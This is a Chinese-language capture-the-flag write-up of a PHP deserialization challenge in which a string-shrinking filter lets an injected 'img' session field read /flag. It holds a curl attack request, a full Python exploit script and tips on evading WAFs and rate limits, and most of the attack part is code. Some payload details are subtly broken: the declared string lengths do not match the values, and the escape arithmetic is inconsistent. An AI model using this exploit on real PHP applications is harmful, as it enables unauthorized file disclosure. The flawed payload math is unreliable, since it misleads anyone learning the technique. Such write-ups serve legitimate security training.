---
title: "[安洵杯 2019] easy_serialize_php"
platform: BUUCTF
category: Web
difficulty: 中等
tags: [php, deserialization, filter-escape, session-manipulation]
vulnerability: PHP序列化逃逸 via filter字符串收缩
solved: true
flag: "flag{需要重新启动实例获取}"
---

# [安洮杯 2019] easy_serialize_php

## 题目概述

PHP反序列化漏洞题目，利用filter函数的字符串收缩特性实现序列化逃逸，注入恶意属性读取敏感文件。

**目标URL**: BUUCTF实例URL

## 信息收集

### 源码分析

```php
<?php
$function = @$_GET['f'];
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
if($_SESSION){ unset($_SESSION); }
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
extract($_POST);
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}
$serialize_info = filter(serialize($_SESSION));
if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();');
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

### 关键发现

1. **filter函数**: 过滤 `php`, `flag`, `php5`, `php4`, `fl1g`，替换为空（字符串收缩）
2. **extract($_POST)**: 允许覆盖变量，包括 `$_SESSION` 属性
3. **序列化流程**: `serialize($_SESSION)` → `filter()` → `unserialize()`
4. **文件读取**: `file_get_contents(base64_decode($userinfo['img']))`

## 漏洞分析

### PHP序列化逃逸原理

当filter函数将过滤词替换为空时，序列化字符串长度字段与实际内容不匹配：

```
原始: s:4:"flag";s:5:"value";
过滤后: s:4:"";s:5:"value";
```

键名长度声明为4，但实际为空，反序列化器会读取后续4个字符作为键名，造成解析错位。

### 利用策略

利用值收缩逃逸注入新的 `img` 属性：

```php
// 目标注入
";s:3:"img";s:20:"L2ZsYWc=";}  // base64("/flag") = L2ZsYWc=

// 构造payload
$_SESSION['user'] = "flag" * N + '";s:3:"img";s:20:"L2ZsYWc=";}'
```

计算收缩量：
- 每个 `flag` 收缩4字节
- Payload长度约28字节
- 需要7个 `flag`

## 利用过程

### Payload构造

```python
import base64

# 目标文件
target = "/flag"
target_b64 = base64.b64encode(target.encode()).decode()  # L2ZsYWc=

# 注入payload
inject = '";s:3:"img";s:20:"' + target_b64 + '";}'

# 收缩词（每个收缩4字节）
word = "flag"
n = len(inject) // len(word)  # 需要7个

# 最终payload
user_value = word * n + inject
# "flagflagflagflagflagflagflag";s:3:"img";s:20:"L2ZsYWc=";}
```

### 发送请求

```bash
curl -X POST "http://TARGET/?f=show_image" \
  -d "_SESSION[user]=flagflagflagflagflagflagflag\";s:3:\"img\";s:20:\"L2ZsYWc=\";}"
```

### 序列化逃逸过程

```
原始序列化:
a:3:{s:4:"user";s:56:"flagflagflagflagflagflagflag";s:3:"img";s:20:"L2ZsYWc=";}";s:8:"function";...}

filter后:
a:3:{s:4:"user";s:56:"";s:3:"img";s:20:"L2ZsYWc=";}";s:8:"function";...}

反序列化解析:
- 读取user值56字节，但实际只有28字节
- 继续读取后续内容作为user值的一部分
- 解析器遇到 ";} 时认为user值结束
- 后续的 s:3:"img";s:20:"L2ZsYWc=" 被解析为新属性
- 注入的img属性覆盖原有img属性
```

## 复现步骤

1. 启动BUUCTF实例，获取目标URL
2. 访问 `?f=phpinfo` 查看环境信息
3. 构造序列化逃逸payload
4. POST请求 `?f=show_image` 携带payload
5. 获取flag文件内容

## 完整Exploit

```python
import requests
import base64

URL = "http://YOUR_INSTANCE.node5.buuoj.cn:81/"

# 目标文件路径
target = "/flag"
target_b64 = base64.b64encode(target.encode()).decode()

# 构造逃逸payload
inject = '";s:3:"img";s:20:"' + target_b64 + '";}'
word = "flag"
n = len(inject) // len(word) + 1
user_value = word * n + inject

# 发送请求
data = {"_SESSION[user]": user_value}
r = requests.post(URL + "?f=show_image", data=data)

# 提取flag
import re
match = re.search(r'flag\{[^}]+\}', r.text)
if match:
    print(f"Flag: {match.group(0)}")
```

## 注意事项

1. **WAF绕过**: 某些实例可能有WAF拦截，尝试：
   - 使用不同的过滤词（`php`, `fl1g`, `php5`）
   - URL编码payload
   - 添加延迟避免频率限制

2. **文件位置**: flag可能在 `/flag`, `/flag.txt`, `/var/www/html/flag.php` 等位置

3. **Base64编码**: 读取路径需要base64编码后作为img值

## 参考资料

- 0CTF 2016 - PHP序列化长度逃逸
- PHP反序列化字符串逃逸原理
